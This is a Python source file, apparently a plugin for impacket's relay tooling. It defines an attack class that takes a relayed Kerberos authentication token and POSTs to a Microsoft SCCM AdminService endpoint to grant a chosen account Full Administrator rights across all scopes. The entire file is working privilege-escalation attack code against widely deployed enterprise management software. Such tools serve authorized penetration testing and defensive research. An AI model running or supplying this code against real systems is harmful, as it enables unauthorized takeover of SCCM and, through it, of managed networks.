import json
import base64
from threading import Thread

from impacket import LOG

ELEVATED = []

class SCCMAdminServiceAttack(Thread):
    """
    Attack class that adds an account as SCCM Full Administrator via the
    AdminService REST API. Authentication and the POST are sent in a single
    request using the Kerberos token stored by HTTPSRelayClient.initConnection().
    """
    PLUGIN_NAMES = ["HTTPS"]

    def __init__(self, config, client, username):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.client = client
        self.username = username.split('/')[1] if '/' in username else username

    def run(self):
        if self.username in ELEVATED:
            LOG.info('Skipping %s, SCCM admin already added for this user' % self.username)
            return

        token = self.config.sccmAdminToken
        auth = base64.b64encode(token).decode('ascii')

        headers = {
            'Authorization': 'Negotiate ' + auth,
            'Content-Type': 'application/json; odata=verbose',
        }
        data = {
            'LogonName': self.config.logonname,
            'AdminSid': self.config.objectsid,
            'DisplayName': self.config.displayname,
            'Permissions': [
                {'CategoryID': 'SMS00ALL', 'CategoryTypeID': 29, 'RoleID': 'SMS0001R'},
                {'CategoryID': 'SMS00001', 'CategoryTypeID':  1, 'RoleID': 'SMS0001R'},
                {'CategoryID': 'SMS00004', 'CategoryTypeID':  1, 'RoleID': 'SMS0001R'},
            ],
        }

        LOG.info("Attempting to add '%s' as SCCM Full Administrator..." % self.config.logonname)
        self.client.request('POST', '/AdminService/wmi/SMS_Admin',
                            headers=headers, body=json.dumps(data))
        ELEVATED.append(self.username)
        res = self.client.getresponse()

        if res.status == 201:
            LOG.info("Successfully added '%s' as SCCM Full Administrator" % self.config.logonname)
        else:
            body = res.read()
            LOG.error("Server returned code %d, attack likely failed" % res.status)
            LOG.debug(body.decode('utf-8', errors='replace'))
